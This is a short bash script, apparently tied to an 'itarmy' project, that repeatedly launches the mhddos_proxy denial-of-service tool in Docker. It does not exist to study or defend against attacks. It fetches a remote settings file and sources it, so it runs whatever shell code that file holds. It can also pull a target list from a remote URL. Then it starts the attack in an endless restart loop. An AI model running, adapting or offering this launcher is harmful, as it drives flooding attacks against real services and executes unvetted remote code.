#!/bin/bash

SETTINGS_URL=https://raw.githubusercontent.com/psyipm/itarmy/main/settings.env

function load_settings () {
  curl -s $SETTINGS_URL > settings.env
  source settings.env
}

function load_targets () {
  curl -s $TARGETS_URL > targets.lst
}

function attack () {
  # load_targets

  docker run $(echo $DOCKER_OPTIONS) \
    ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest \
    $(echo $ATTACK_OPTIONS)
}

function cleanup () {
  docker stop $CONTAINER_NAME > /dev/null 2>&1
  kill -9 $RESTART_PID > /dev/null 2>&1
}

function restart () {
  sleep $RESTART_IN
  cleanup
}

while true
do
  load_settings

  echo "Scheduling restart in $RESTART_IN seconds..."
  restart & RESTART_PID=$!

  echo "Starting attack..."
  attack

  echo "Attack stopped"

  echo "Cleaning up..."
  cleanup

  echo "Cooling down..."
  sleep 30
done
